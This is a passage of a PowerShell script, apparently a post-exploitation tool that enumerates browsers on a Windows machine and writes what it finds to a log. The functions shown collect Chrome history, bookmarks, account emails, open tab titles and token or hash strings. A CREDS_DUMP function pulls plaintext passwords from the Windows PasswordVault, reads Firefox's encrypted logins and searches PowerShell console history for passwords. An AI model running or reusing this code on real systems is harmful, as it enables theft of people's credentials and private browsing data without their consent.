                ForEach ($Key in $Regex){
                    echo "`n" $Key >> $LogFilePath\BrowserEnum.log
                }
        }else{
            cd $env:tmp
            ## Convert from jsonlz4 to json
            .\mozlz4-win32.exe --extract output.jsonlz4 output.json
            $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
            $SplitString = $DumpFileData.split(',')
            $findUri = $SplitString|findstr /I /C:"uri"
            $Deliconuri = $findUri|findstr /V /C:"iconuri"
            $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}','' -replace ']',''
            echo $ParsingData >> $LogFilePath\BrowserEnum.log
            Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
            Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
        }
    }
    cd $IPATH
    If(Test-Path "$env:tmp\output.jsonlz4"){Remove-Item -Path "$env:tmp\output.jsonlz4" -Force}
}


function CHROME {
    ## Retrieve Google Chrome Browser Information
    echo "`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
    echo "--------------" >> $LogFilePath\BrowserEnum.log
    $Chrome_App = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
    If(-not($Chrome_App) -or $Chrome_App -eq $null){
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }else{
        ## Test if browser its active 
        $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
        $CHTestings = (Get-Process Chrome -ErrorAction SilentlyContinue).Responding
        If($CHTestings -eq $True){
            $Status = "Status       : Active"
            ## Get Browser startTime
            $BsT = Get-Process Chrome|Select -ExpandProperty StartTime
            $StartTime = $BsT[0];$FinalOut = "StartTime    : $StartTime"
            $SSID = get-process Chrome|Select -Last 1|Select-Object -Expandproperty Id
            $PSID = "Process PID  : $SSID"
        }else{
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires Chrome process running}"
            $FinalOut = "StartTime    : {requires Chrome process running}"
        }
        echo "$Status" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Download Pref Settings
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Download = $Parse_String|select-string "download" # directory_upgrade
        $Store_Dump = $Search_Download[1] # download_history Property
        $Parse_Dump = $Store_Dump -replace '"','' -replace ':','      : ' -replace 'download_history','History'
        If(-not($Parse_Dump) -or $Parse_Dump -eq $null){
            echo "History      : {null}" >> $LogFilePath\BrowserEnum.log
        }else{
            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
        }

        ## Retrieve Browser accept languages
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Lang = $Parse_String|select-string "accept_languages"
        $Parse_Dump = $Search_Lang -replace '"','' -replace 'intl:{','' -replace ':','    : ' -replace 'accept_languages','Languages'
        If(-not($Parse_Dump) -or $Parse_Dump -eq $null){
            echo "Languages    : {null}" >> $LogFilePath\BrowserEnum.log
        }else{
            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
        }

        ## Retrieve Browser Version
        $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
        echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log

        ## Retrieve Download Folder (default_directory) Settings
        $Parse_String = $Preferencies_Path.split(",")
        $Download_Dir = $Parse_String|select-string "savefile"
        If(-not($Download_Dir) -or $Download_Dir -eq $null){
            echo "Downloads    : $env:userprofile\Downloads" >> $LogFilePath\BrowserEnum.log
        }else{
            $Parse_Dump = $Download_Dir -replace '"','' -replace '{','' -replace '}','' -replace 'default_directory:','' -replace 'savefile:','Downloads    : '
            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
        }

        ## leak Chrome.exe binary path
        $BinaryPath = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($BinaryPath) -or $BinaryPath -eq $null){
            echo "BinaryPath   : {requires chrome process running}" >> $LogFilePath\BrowserEnum.log
        }else{
            $BinaryPath = Get-Process chrome|Select -ExpandProperty Path
            $parseData = $BinaryPath[0]
            echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
        }
        echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
        echo "$PSID" >> $LogFilePath\BrowserEnum.log

        ## leak Chrome Last Active Tab windowsTitle
        echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
        echo "------------------" >> $LogFilePath\BrowserEnum.log
        $checkTitle = Get-Process chrome -ErrorAction SilentlyContinue
        If(-not($checkTitle)){
            echo "{requires chrome process running}`n" >> $LogFilePath\BrowserEnum.log
        }else{
            $StoreData = Get-Process chrome|Select -ExpandProperty MainWindowTitle
            $ParseData = $StoreData|where {$_ -ne ""}
            $MyPSObject = $ParseData -replace '- Google Chrome',''
            ## Write my PSobject to logfile
            echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
        }

        ## Retrieve Email(s) from Google CHROME preferencies File ..
        $Parse_String = $Preferencies_Path.split(",")
        $Search_Email = $Parse_String|select-string "email"
        $Parse_Dump = $Search_Email -replace '"','' -replace 'email:',''
        If(-not($Search_Email) -or $Search_Email -eq $null){
            echo "Email            : {None Email Found}" >> $LogFilePath\BrowserEnum.log
        }else{
            ## Build new PSObject to store emails found
            $Store = ForEach ($Email in $Parse_Dump){
                New-Object -TypeName PSObject -Property @{
                    Emails = $Email
                }
            }
            ## Write new PSObject to logfile
            echo $Store >> $LogFilePath\BrowserEnum.log
            }
        }

        ## Retrieve Chrome History
        # Source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
        echo "Chrome History" >> $LogFilePath\BrowserEnum.log
        echo "--------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History")){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
            $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
            $Get_Values|ForEach-Object {
                $Key = $_
                if ($Key -match $Search){
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome bookmarks
        echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
        echo "----------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks")) {
            echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
            $Output = ConvertFrom-Json20($Json)
            $Jsonobject = $Output.roots.bookmark_bar.children
            $Jsonobject.url|Sort -Unique|ForEach-Object {
                if ($_ -match $Search) {
                    echo "$_" >> $LogFilePath\BrowserEnum.log
                }
            }
        }

        ## Retrieve Chrome (Tokens|Hashs)
        echo "`n`nChrome Hashs|Tokens" >> $LogFilePath\BrowserEnum.log
        echo "-------------------" >> $LogFilePath\BrowserEnum.log
        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences")){
            echo "{Could not find any Hashs|Tokens}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Preferencies_Path = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
            $Parse_String = $Preferencies_Path.split(",");$Find_MyHashes = $Parse_String|Select-String -pattern "hash","token"
            $BadChars = $Find_MyHashes -replace '"','' -replace '{','' -replace '\[','' -replace '}','' -replace '\]',''
            $Dump_Key_Hash = $BadChars|Select-String -pattern '[=]$' # Regex to match the last char '=' of the string.
            echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
        }
}


function ADDONS {  
    ## Retrieve IE addons
    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
    echo "`nName" >> $LogFilePath\BrowserEnum.log
    echo "----" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings")){
        echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
    }else{
        If(-not(Test-Path HKCR:)){New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT|Out-Null} 
        $Registry_Keys = @( "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\explorer\Browser Helper Objects",
        "HKLM:\Software\Microsoft\Internet Explorer\URLSearchHooks",
        "HKLM:\Software\Microsoft\Internet Explorer\Extensions",
        "HKCU:\Software\Microsoft\Internet Explorer\Extensions" )
        $Registry_Keys|Get-ChildItem -Recurse -ErrorAction SilentlyContinue|Select -ExpandProperty PSChildName |  
            ForEach-Object { 
                If(Test-Path "HKCR:\CLSID\$_"){ 
                    $CLSID = Get-ItemProperty -Path "HKCR:\CLSID\$_" | Select-Object @{n="Name";e="(default)"}
                    $CLSIData = $CLSID -replace '@{Name=','' -replace '}',''
                    echo "$CLSIData" >> $LogFilePath\BrowserEnum.log
                }
            }
    }

    ## Retrieve firefox addons
    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json")){
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
        If(-not(Test-Path "$Bookmarks_Path")){
            echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions.json" # (IEFP)
            $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
            $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
        }  
    }else{
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\extensions.json"
        $Json = Get-Content "$Bookmarks_Path" -Raw|ConvertFrom-Json|select *
        $Json.addons|select-object -property defaultLocale|Select-Object -ExpandProperty defaultLocale|Select-Object Name,description >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve Chrome addons
    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json")){
        echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
        $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
    }
}


function CREDS_DUMP {
    ## Retrieve IE Credentials
    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
    echo "`nhttps://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1" >> $LogFilePath\BrowserEnum.log
    echo "--------------------------------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
    If(-not($DumpVault) -or $DumpVault -eq $null){
        echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
    }else{
        echo "$DumpVault" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve FireFox Credentials
    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
    echo "`ngit clone https://github.com/Unode/firefox_decrypt.git" >> $LogFilePath\BrowserEnum.log
    echo "------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
        If(-not(Test-Path "$Bookmarks_Path")){
            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
        }else{
            $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
            $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
            $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
            $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
        }  
    }else{
        $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"
        $Json = Get-Content "$Bookmarks_Path"|ConvertFrom-Json|select *
        $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
        $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve Chrome Credentials (plain text)
    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
    echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
        echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
    }else{
        $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|Select-String -pattern "http","https"
        If(-not($Json) -or $Json -eq $null){
            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
        }else{
            ForEach ($Key in $Json){
                $Regex = $Key -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
                $ParseData = $Regex.Split('/')[2]            # Extract from string only the DomainName ..
                echo $ParseData >> $LogFilePath\BrowserEnum.log
            }
       }
    }
    
    ## Search for passwords in { ConsoleHost_history }
    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
        echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
        echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
        echo "{ConsoleHost_history.txt not found}" >> $LogFilePath\BrowserEnum.log
    }else{
        $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
        $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
        If(-not($Credentials) -or $Credentials -eq $null){
            echo "`n`nCreds in ConsoleHost_history" >> $LogFilePath\BrowserEnum.log
            echo "----------------------------" >> $LogFilePath\BrowserEnum.log
            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
        }else{
            ## Loop in each string found
            $MyPSObject = ForEach ($token in $Credentials){
                New-Object -TypeName PSObject -Property @{
                    "Creds in ConsoleHost_history" = $token
                }
            }
            echo "`n" $MyPSObject >> $LogFilePath\BrowserEnum.log
        }
    }
}
 

## Jump Links (Functions)
If($param1 -eq "-IE"){IE_Dump}
If($param1 -eq "-CHROME"){CHROME}
If($param1 -eq "-ADDONS"){ADDONS}
If($param1 -eq "-FIREFOX"){FIREFOX}
If($param1 -eq "-CREDS"){CREDS_DUMP}
If($param1 -eq "-RECON"){BROWSER_RECON}
If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}

## NOTE: ForEach - Build PSObject displays ..
# $StoreData = ForEach ($Key in $Input_String){
#     New-Object -TypeName PSObject -Property @{
#         Data = $Key
#     } 
# }
# Write-Host $StoreData|Out-File "$env:tmp\report.log"

## Retrieve Remote Info from LogFile
Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
If($mpset -eq $False){Remove-Item $LogFilePath\BrowserEnum.log -Force}
Exit
